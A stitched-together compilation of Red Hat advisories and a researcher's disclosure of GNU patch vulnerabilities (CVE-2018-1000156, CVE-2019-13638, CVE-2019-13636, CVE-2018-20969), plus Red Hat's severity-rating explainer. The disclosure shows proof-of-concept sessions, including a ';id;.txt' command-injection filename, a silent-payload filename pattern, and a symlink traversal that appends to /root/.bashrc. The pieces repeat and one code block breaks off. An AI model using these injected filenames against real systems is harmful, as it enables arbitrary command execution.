[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A3758)

## Topic

An update for patch is now available for Red Hat Enterprise Linux 7.6 Extended Update Support.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The patch program applies diff files to originals. The diff command is used to compare an original to a changed file. Diff lists the changes made to the file. A person who has the original file can then use the patch command with the diff file to add the changes to their original file (patching the file).

Security Fix(es):

* patch: do\_ed\_script in pch.c does not block strings beginning with a ! character (CVE-2018-20969)
* patch: OS shell command injection when processing crafted patch files (CVE-2019-13638)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A2798)

## Topic

An update for patch is now available for Red Hat Enterprise Linux 8.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The patch program applies diff files to originals. The diff command is used to compare an original to a changed file. Diff lists the changes made to the file. A person who has the original file can then use the patch command with the diff file to add the changes to their original file (patching the file).

Security Fix(es):

* patch: do\_ed\_script in pch.c does not block strings beginning with a ! character (CVE-2018-20969)
* patch: OS shell command injection when processing crafted patch files (CVE-2019-13638)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.

# GNU patch vulnerabilities

I identified several vulnerabilities in the GNU patch utility, some of them making it possible to execute
arbitrary code if the victim opens a crafted patch file. It also turned out, some of these vulnerabilities
had been silently addressed by the maintainer back then in 2018 when CVE-2018-1000156 was reported by
pushing some additional commits the same day, but only the primary patch was picked up by many Linux
distributions (like Debian, Ubuntu or Fedora).

## The vulnerabilities

### CVE-2018-1000156 - unrestricted ed input

This finding belongs to someone else, but unfortunately I'm unsure who the author is.
The original thread on the official bug report site:

<https://savannah.gnu.org/bugs/?53566>

The official patch of CVE-2018-1000156 is:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=123eaff0d5d1aebe128295959435b9ca5909c26d>

According to the comment of the commit:

* src/pch.c (do\_ed\_script): Write ed script to a temporary file
  instead of piping it to ed: this will cause ed to abort on invalid
  commands instead of rejecting them and carrying on.

The thing is, `ed`'s behaviour is different when the script is coming
from a pipe (see the edoffset.script attached):

```
root@55c24e15f7e6:/data/edstyle5# touch whatever
root@55c24e15f7e6:/data/edstyle5# cat edoffset.script | ed whatever
0
?
!
0
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
uid=0(root) gid=0(root) groups=0(root)

```

And when it is duped:

```
root@55c24e15f7e6:/data/edstyle5#  rm id-proof.txt
root@55c24e15f7e6:/data/edstyle5#  ed whatever < edoffset.script
0
?
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
cat: id-proof.txt: No such file or directory

```

And now the same via patch:

```
root@55c24e15f7e6:/data/edstyle5# ../patch-2.7.6-vanilla/patch-2.7.6/src/patch  < CVE-2018-1000156.patch
patching file file
?
foo
../patch-2.7.6-vanilla/patch-2.7.6/src/patch: **** /bin/ed FAILED
root@55c24e15f7e6:/data/edstyle5# cat CVE-2018-1000156-proof.txt
uid=0(root) gid=0(root) groups=0(root)

```

`CVE-2018-1000156.patch` here is pretty much the same as the original PoC created
for that issue (`poc.patch` among the attachments on savannah linked above).

### CVE-2019-13638 - Shell command injection while invoking ed

The GNU `patch` utility used to invoke `ed` via the shell interpreter and the filenames
were not sanitized correctly, making it vulnerable to shell command injection.
This way, exploitation of CVE-2019-13638 doesn't even require `ed` to be installed.

The official fix was commited the same day as for CVE-2018-1000156, but many distributions
didn't pick it up:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The proof of concept:

```
root@3ffaeb445eab:/data/edstyle4# patch --version
GNU patch 2.7.6
...

root@3ffaeb445eab:/data/edstyle4# patch < CVE-2019-13638.patch
patching file ';id;.txt'
sh: 1: ed: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 1: .txt.o60SfgR: not found
patch: **** ed FAILED

```

### CVE-2019-13636 - Directory traversal and file append

The directory traversal here made it possible to escape the working directory of patch
and append (almost) arbitrary file content to any files on the file system.

This finding is brand new and was fixed only after I reported it. Official patch:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=dce4683cbbe107a95f1f0d45fabc304acfb5d71a>

When patch was saving a rejection, it did not check properly whether the file already
exists or not. This could be abused to escape the working dir:

```
root@3ffaeb445eab:/data/test1/test-apply3#  cat CVE-2019-13636.patch | patch
patching symbolic link home
patching symbolic link home.rej
File home is not a regular file -- refusing to patch
1 out of 1 hunk ignored -- saving rejects to file home.rej
patching symbolic link home
patching symbolic link home.rej

root@3ffaeb445eab:/data/test1/test-apply3# cat /root/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
...
# alias mv='mv -i'
--- home
+++ home
@@ -0,0 +1,3 @@
+ partially
+ controlled
+ content

```

### CVE-2018-20969 - OS shell command execution via ! prefixed ed filenames

If `ed` receives an exclaimation mark prefixed command line argument, it is executed
as a shell command via popen. This was exploitable via GNU `patch` as well.

Official fix:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The referenced patch is the same as for CVE-2019-13638; note the assertion line.

(Yes, CVE-2018-20969 was reported by me in 2019 along with the other two and MITRE indeed
assigned a 2018 ID for it)

Since `ed` is capturing the output of what it executes and the same version of GNU `patch` was vulnerable
I decided to build 2 versions of `patch` with the above patch applied, one with the assertion line and
one without it.

```
root@a8e181dcb4b1:/data# diff /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/pch.c /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/pch.c

## Synopsis

Important: patch security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A2964)

## Topic

An update for patch is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The patch program applies diff files to originals. The diff command is used to compare an original to a changed file. Diff lists the changes made to the file. A person who has the original file can then use the patch command with the diff file to add the changes to their original file (patching the file).

Security Fix(es):

* patch: do\_ed\_script in pch.c does not block strings beginning with a ! character (CVE-2018-20969)
* patch: OS shell command injection when processing crafted patch files (CVE-2019-13638)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.

# Details about recent GNU patch vulnerabilities

---

*From*: Imre Rad <radimre83 () gmail com>

*Date*: Fri, 16 Aug 2019 11:13:55 +0200

---

```
I identified several vulnerabilities in the GNU patch utility, some of
them making it possible to execute arbitrary code if the victim opens
a crafted patch file. It also turned out, some of these
vulnerabilities had been silently addressed by the maintainer back
then in 2018 when CVE-2018-1000156 was reported. Some Linux
distributions (like Debian, Ubuntu or Fedora) applied only the primary
patch and thus they remained vulnerable to the attack vectors
described below.

The PoC files can be found in this repository:

<https://github.com/irsl/gnu-patch-vulnerabilities>

CVE-2018-1000156 - unrestricted ed input

I'm unsure who the author of this finding is, but adding some details
to make the story more clear. The original thread on the official bug
report site:

<https://savannah.gnu.org/bugs/?53566>

The official patch of CVE-2018-1000156 is:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=123eaff0d5d1aebe128295959435b9ca5909c26d>

According to the comment of the commit:

src/pch.c (do_ed_script): Write ed script to a temporary file instead
of piping it to ed: this will cause ed to abort on invalid commands
instead of rejecting them and carrying on.

The thing is, ed's behaviour is different when the ed script is coming
from a pipe (see the edoffset.script attached):

root@55c24e15f7e6:/data/edstyle5# touch whatever
root@55c24e15f7e6:/data/edstyle5# cat edoffset.script | ed whatever
0
?
!
0
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
uid=0(root) gid=0(root) groups=0(root)

And when it is duped:

root@55c24e15f7e6:/data/edstyle5#  rm id-proof.txt
root@55c24e15f7e6:/data/edstyle5#  ed whatever < edoffset.script
0
?
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
cat: id-proof.txt: No such file or directory

And now the same via patch:

root@55c24e15f7e6:/data/edstyle5#
../patch-2.7.6-vanilla/patch-2.7.6/src/patch  < CVE-2018-1000156.patch

CVE-2018-1000156.patch here is pretty much the same as the original
PoC created for that issue (poc.patch among the attachments on
savannah linked above).

CVE-2019-13638 - Shell command injection while invoking ed

The GNU patch utility used to invoke ed via the shell interpreter and
the filenames were not sanitized correctly, making it vulnerable to
shell command injection. This way, exploitation of CVE-2019-13638
doesn't even require ed to be installed.

The official fix was pushed to the repo the same day as for
CVE-2018-1000156, but many distributions didn't pick it up:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The proof of concept:

root@3ffaeb445eab:/data/edstyle4# patch --version
GNU patch 2.7.6
...

root@3ffaeb445eab:/data/edstyle4# patch < CVE-2019-13638.patch
patching file ';id;.txt'
sh: 1: ed: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 1: .txt.o60SfgR: not found
patch: **** ed FAILED

I think a filename like "2>/dev/null; real payload; exit 0 #" could
make the overall result of the patch execution successful without
showing any errors.

CVE-2019-13636 - Directory traversal and file append

The directory traversal here made it possible to escape the working
directory of patch and append (almost) arbitrary file content to any
files on the file system.

This finding is unrelated to the 2018 one, and was fixed only after I
reported it. Official patch:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=dce4683cbbe107a95f1f0d45fabc304acfb5d71a>

When patch was saving a rejection, it did not check properly whether
the file already exists or not. This could be abused to escape the
working dir:

root@3ffaeb445eab:/data/test1/test-apply3#  cat CVE-2019-13636.patch | patch

# ~/.bashrc: executed by bash(1) for non-login shells.
...
# alias mv='mv -i'
--- home

CVE-2018-20969 - OS shell command execution via ! prefixed ed filenames

If ed receives an exclaimation mark prefixed command line argument, it
is executed as a shell command via popen. This was exploitable via GNU
patch as well.

Official fix:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The referenced patch is the same as for CVE-2019-13638; note the assertion line.

(Yes, CVE-2018-20969 was reported by me in 2019 along with the other
two and MITRE indeed assigned a 2018 ID for it)

Since ed is capturing the output of what it executes and the same
version of GNU patch was vulnerable I decided to build 2 versions of
patch with the above patch applied, one with the assertion line and
one without it.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A3757)

## Topic

An update for patch is now available for Red Hat Enterprise Linux 7.5 Extended Update Support.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The patch program applies diff files to originals. The diff command is used to compare an original to a changed file. Diff lists the changes made to the file. A person who has the original file can then use the patch command with the diff file to add the changes to their original file (patching the file).

Security Fix(es):

* patch: do\_ed\_script in pch.c does not block strings beginning with a ! character (CVE-2018-20969)
* patch: OS shell command injection when processing crafted patch files (CVE-2019-13638)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A4061)

## Topic

An update for patch is now available for Red Hat Enterprise Linux 7.4 Advanced Update Support, Red Hat Enterprise Linux 7.4 Telco Extended Update Support, and Red Hat Enterprise Linux 7.4 Update Services for SAP Solutions.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The patch program applies diff files to originals. The diff command is used to compare an original to a changed file. Diff lists the changes made to the file. A person who has the original file can then use the patch command with the diff file to add the changes to their original file (patching the file).

Security Fix(es):

* patch: do\_ed\_script in pch.c does not block strings beginning with a ! character (CVE-2018-20969)
* patch: OS shell command injection when processing crafted patch files (CVE-2019-13638)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.
